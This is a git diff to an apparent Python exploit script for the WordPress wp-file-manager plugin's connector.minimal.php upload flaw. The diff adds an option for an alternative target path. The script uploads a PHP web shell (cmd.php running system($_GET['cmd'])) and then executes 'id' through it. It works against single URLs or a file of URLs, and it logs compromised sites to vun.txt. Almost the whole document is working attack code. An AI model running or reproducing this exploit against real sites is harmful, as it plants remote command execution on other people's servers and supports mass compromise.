@@ -23,35 +23,48 @@ session = requests.Session()
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url", required=False,help="URL of host to check will need http or https")
 parser.add_argument("-f", "--file",required=False, help="File of URLS to check")
+parser.add_argument("-p", "--Path",required=False, help="Check Alternative Path")
 
 
 args = parser.parse_args()
 files = args.file
 URL = args.url
+Path = args.Path
+if Path:
+	Path = args.Path
+else:
+	Path = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
 
-def test_page(URL):
+def test_page(URL,Path):
 	print ("[+] Testing "+URL+" [+]")
 	
 
 
 
 
-	url = ""+URL+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+	url = ""+URL+""+Path+""
 	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074", "Connection": "close"}
 	data = "-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"cmd.php\"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"
 	response = requests.post(url, headers=headers, data=data,timeout=10,verify=False)
 	
 	
 	if "dispInlineRegex" in response.text:
-		print ("[*]Shell Uploaded "+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id[*]")
-		r = requests.get(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id",timeout=10,verify=False,headers=headers)
-		print ("Output: "+r.text+"")
-		text_file = open("vun.txt", "a")
-		text_file.write(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id\n")
-		text_file.close()
+		if Path == "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php":
+			print ("[*]Shell Uploaded "+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id[*]")
+			r = requests.get(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id",timeout=10,verify=False,headers=headers)
+			print ("Output: "+r.text+"")
+			text_file = open("vun.txt", "a")
+			text_file.write(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id\n")
+			text_file.close()
+		else:
+			print ("[*]Shell Uploaded "+url+" [*]")
+			print ("[*] Alternative Path will require investigation to find where the shell has been uploaded to. [*]")
+			text_file = open("vun-alt-Path.txt", "a")
+			text_file.write(""+url+"\n")
+			text_file.close()
 	else:
-		print("[*] Shell Upload Failed[*]")
-		print(response.text)
+		print("[*] Shell Upload Failed [*]")
+		#print(response.text)
 
 
 if files:
@@ -60,7 +73,7 @@ if files:
 			for line in f:
 				URL = line.replace("\n","")
 				try:
-					test_page(URL)
+					test_page(URL,Path)
 				except KeyboardInterrupt:
 					print ("Ctrl-c pressed ...")
 					sys.exit(1)
@@ -70,7 +83,7 @@ if files:
 		f.close()
 				
 elif URL:
-	test_page(URL)
+	test_page(URL,Path)
 	
 else:
 	print("[-] No Options Set [-]")
